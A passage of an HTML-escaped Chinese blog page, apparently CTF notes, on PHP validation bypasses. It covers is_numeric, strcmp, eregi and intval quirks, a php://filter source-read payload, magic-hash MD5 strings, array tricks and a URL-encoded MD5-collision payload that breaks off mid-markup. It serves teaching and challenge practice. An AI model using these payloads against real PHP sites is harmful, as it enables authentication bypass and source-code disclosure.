+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 将数字判断为非数字&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;123&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;，或者 &lt;span class=&#34;hljs-number&#34;&gt;123&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;  其中的%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;只能放在最后，否则%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;后面的部分会被继续做判断&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 将非数字转化为数字&lt;/span&gt;&lt;br&gt;使用十六进制&lt;span class=&#34;hljs-number&#34;&gt;0x123456&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;strcmp&#34;&gt;&lt;a href=&#34;#strcmp&#34; class=&#34;headerlink&#34; title=&#34;strcmp()&#34;&gt;&lt;/a&gt;strcmp()&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;当传入的变量为数组时可以得到&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;strcmp&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(password[],&lt;span class=&#34;hljs-string&#34;&gt;&#39;xxxxxx&#39;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;==&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;addslashes&#34;&gt;&lt;a href=&#34;#addslashes&#34; class=&#34;headerlink&#34; title=&#34;addslashes()&#34;&gt;&lt;/a&gt;addslashes()&lt;/h2&gt;&lt;figure class=&#34;highlight ada&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ada&#34;&gt;转译单引号&lt;br&gt;&#39;   &lt;span class=&#34;hljs-comment&#34;&gt;---&amp;gt;   \&#39;&lt;/span&gt;&lt;br&gt;\   &lt;span class=&#34;hljs-comment&#34;&gt;---&amp;gt;   \\&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;parse-url&#34;&gt;&lt;a href=&#34;#parse-url&#34; class=&#34;headerlink&#34; title=&#34;parse_url&#34;&gt;&lt;/a&gt;parse_url&lt;/h2&gt;&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ruby&#34;&gt;该函数将输入的字符串解析为协议，主机名等几部分&lt;br&gt;但当字符串以 /&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt; 开头时，会返回&lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;file-get-contents&#34;&gt;&lt;a href=&#34;#file-get-contents&#34; class=&#34;headerlink&#34; title=&#34;file_get_contents()&#34;&gt;&lt;/a&gt;file_get_contents()&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&#39;r&#39;&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 其中的$text可以传入php伪协议：data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=,从而读取到的就是传入的字符串了&lt;/span&gt;&lt;br&gt;file=php:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;filter&lt;span class=&#34;hljs-regexp&#34;&gt;/read=convert.base64-encode/&lt;/span&gt;resource=useless.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;eregi&#34;&gt;&lt;a href=&#34;#eregi&#34; class=&#34;headerlink&#34; title=&#34;eregi()&#34;&gt;&lt;/a&gt;eregi()&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight arcade&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs arcade&#34;&gt;在一个字符串搜索指定的模式的字符串。搜索不区分大小写。可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。&lt;br&gt;eregi (&lt;span class=&#34;hljs-string&#34;&gt;&#34;/\w{8,10}/&#34;&lt;/span&gt;, &lt;span class=&#34;hljs-symbol&#34;&gt;$password&lt;/span&gt;)  匹配成功返回&lt;span class=&#34;hljs-literal&#34;&gt;TRUE&lt;/span&gt;否则返回&lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;&lt;br&gt;截断漏洞&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;1.&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;截断及遇到%&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;则默认为字符串的结束&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2.&lt;/span&gt;当传入的字符串为数组时，返回的值为&lt;span class=&#34;hljs-literal&#34;&gt;TRUE&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+
+
+&lt;h2 id=&#34;intval&#34;&gt;&lt;a href=&#34;#intval&#34; class=&#34;headerlink&#34; title=&#34;intval&#34;&gt;&lt;/a&gt;intval&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;Intval最大的值取决于操作系统。 &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt; 位系统最大带符号的 &lt;span class=&#34;hljs-keyword&#34;&gt;integer&lt;/span&gt; 范围是 -&lt;span class=&#34;hljs-number&#34;&gt;2147483648&lt;/span&gt; 到 &lt;span class=&#34;hljs-number&#34;&gt;2147483647&lt;/span&gt;。&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。&lt;/span&gt;&lt;br&gt;&lt;br&gt;这个有个应用就是在判断数值是不是回文上，如果参数为&lt;span class=&#34;hljs-number&#34;&gt;2147483647&lt;/span&gt;，那么当它反过来，由于超出了限制，所以依然等于&lt;span class=&#34;hljs-number&#34;&gt;2147483647&lt;/span&gt;。即为回文。&lt;br&gt;    &lt;br&gt;    &lt;br&gt; 在处理数字时，若数字为科学计数法则输出前面的部分&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;intval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;1e10&#34;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 1&lt;/span&gt;&lt;br&gt;但是在加上一个数字后则不同&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;intval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;1e10&#34;&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 10000000001&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;array-search&#34;&gt;&lt;a href=&#34;#array-search&#34; class=&#34;headerlink&#34; title=&#34;array_search&#34;&gt;&lt;/a&gt;array_search&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight abnf&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs abnf&#34;&gt;array_search会根据键名索引键值，若使用array_search(键名，目标)&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;false判断，当返回的键值的值为&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;时，&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;false为TRUE&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+
+
+&lt;h2 id=&#34;弱类型&#34;&gt;&lt;a href=&#34;#弱类型&#34; class=&#34;headerlink&#34; title=&#34;弱类型&#34;&gt;&lt;/a&gt;弱类型&lt;/h2&gt;&lt;hr&gt;
+&lt;h3 id=&#34;“-x3D-x3D-”和“-x3D-x3D-x3D-”&#34;&gt;&lt;a href=&#34;#“-x3D-x3D-”和“-x3D-x3D-x3D-”&#34; class=&#34;headerlink&#34; title=&#34;“==”和“===”&#34;&gt;&lt;/a&gt;&lt;strong&gt;“==”和“===”&lt;/strong&gt;&lt;/h3&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# “==”我们称之为等值符，当等号两边为相同类型时，直接比较值是否相等；当等号两边类型不同时，先转换为相同的类型，再对转换后的值进行比较，如果比较一个数字和字符串或者涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照常数值进行比较。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;admin&#34;&lt;/span&gt;==&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);  &lt;span class=&#34;hljs-comment&#34;&gt;//true 即所有的纯字符串进行类型 转化后都变为了0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;1admin&#34;&lt;/span&gt;==&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;//true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;admin1&#34;&lt;/span&gt;==&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;//false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;admin1&#34;&lt;/span&gt;==&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;//true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 转化后的结果只和开头部分相关，若开头部分不是数字，则默认转化为0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;0e123456&#34;&lt;/span&gt;==&lt;span class=&#34;hljs-string&#34;&gt;&#34;0e4456789&#34;&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;//true &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;以下是值不同，但是MD5相同的字符串，可以用于弱类型比较&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;byGcY&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0e591948146966052067035298880982&lt;/span&gt;&lt;br&gt;sonZ7y&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0e463306343746311593316642162425&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;也可以使用数组绕过a[]=123&amp;amp;&amp;amp;b[]=456&lt;/p&gt;
+&lt;p&gt;计算得到的MD5进行若比较也相等&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;===&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight crmsh&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs crmsh&#34;&gt;先比较类型相等再进行比较&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;op&lt;/span&gt; === &lt;span class=&#34;hljs-string&#34;&gt;&#34;2&#34;&lt;/span&gt;&lt;br&gt;&lt;br&gt;由于是===必须是类型和数值都等于&#39;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;&#39;,所以可以让&lt;span class=&#34;hljs-keyword&#34;&gt;op&lt;/span&gt;等于数字&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;来绕&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;a[]=123&amp;amp;&amp;amp;b[]=456同样可以绕过强比较&lt;/p&gt;
+&lt;h3 id=&#34;强类型MD5绕过&#34;&gt;&lt;a href=&#34;#强类型MD5绕过&#34; class=&#34;headerlink&#34; title=&#34;强类型MD5绕过&#34;&gt;&lt;/a&gt;强类型MD5绕过&lt;/h3&gt;&lt;figure class=&#34;highlight llvm&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs llvm&#34;&gt;a&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c9&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%68&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%ff&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%e3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d4&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%77&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%15&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%87&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%a7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%1&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%dc&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%56&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;a&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%78&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%18&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%af&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%bf&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%00&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%28&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%f3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%8&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%42&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%75&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%93&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%49&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%67&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%a0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%83&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%60&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fb&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%07&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fe&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;br&gt;b&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c9&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%68&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%ff&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%e3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d4&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%77&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%15&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%87&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%a7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%1&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%dc&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%56&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;a&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%78&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%18&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%af&lt;/span&gt;&lt;span 